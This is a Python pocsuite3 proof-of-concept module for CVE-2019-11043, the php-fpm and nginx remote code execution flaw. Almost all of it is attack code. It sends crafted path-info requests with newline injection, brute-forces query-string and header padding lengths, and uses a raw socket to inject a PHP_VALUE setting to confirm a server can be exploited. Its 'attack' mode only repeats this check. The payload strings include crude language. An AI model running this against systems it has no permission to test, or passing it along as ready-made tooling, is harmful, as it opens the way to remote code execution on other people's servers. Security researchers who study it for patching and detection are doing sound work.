#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from pocsuite3.api import POCBase
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import logger
import socket


class PhpUip():
    def __init__(self, url):
        self.MinQSL = 1500
        self.MaxQSL = 1950
        self.url = url
        self.BreakingPayload = "/PHP%0Ais_the_shittiest_lang.php"
        self.PossibleQSLs = []
        self.MaxPisosLength = 256
        self.qslandpisos = None

    def get_baseStatus(self):
        target = self.url + "/path%0Ainfo.php?{}".format('Q' * (self.MinQSL - 1))
        self.baseStatus = req.get(target).status_code

    def get_qsl(self):
        for qsl in range(self.MinQSL, self.MaxQSL, 5):
            resp = req.get(self.url + self.BreakingPayload + "?" + "Q" * (qsl - 1))
            if resp.status_code != self.baseStatus:
                self.PossibleQSLs = [qsl, qsl - 5, qsl - 10]

    def SanityCheck(self):
        header = {
            "D-Pisos": "8{}D".format("=" * self.MaxPisosLength)
        }
        for _ in range(10):
            if req.get(self.url + "/PHP%0ASOSAT?" + "Q" * (self.MaxQSL - 1),
                       headers=header).status_code == self.baseStatus:
                pass
            else:
                return False
        return True

    def get_pisos(self):
        host = urlparse(self.url).hostname
        port = urlparse(self.url).port
        for qsl in self.PossibleQSLs:
            for pisos in range(self.MaxPisosLength):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                head = "GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?{} HTTP/1.1\r\n".format("Q" * (qsl - 1))
                head += "Host: {}:{}\r\n".format(host, str(port))
                head += "User-Agent: Mozilla/5.0\r\n"
                head += "D-Pisos: 8{}D\r\n".format("=" * pisos)
                head += "Ebut: mamku tvoyu\r\n\r\n"
                s.connect((host, port))
                s.send(head)
                recv = s.recv(1024)
                if "PHPSESSID" in recv and "path=" in recv:
                    self.qslandpisos = (qsl, pisos)
                    return
                s.close()

    def poc(self):
        self.get_baseStatus()
        self.get_qsl()
        if self.PossibleQSLs:
            if self.SanityCheck():
                self.get_pisos()
                if self.qslandpisos:
                    return True
        return False


class PHPFPM(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = 'fairy'
    vulDate = '2019-10-25'
    createDate = ''
    updateDate = ''
    references = ['']
    name = 'php-fpm Remote Code Execution CVE-2019-11043'
    appPowerLink = ''
    appName = 'php-fpm and nginx'
    appVersion = 'all'
    vulType = 'rce'
    desc = ''' 
    PHP-fpm 远程代码执行漏洞(CVE-2019-11043)
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}
        test = PhpUip(self.url + '/index.php')
        if test.poc():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output


register_poc(PHPFPM)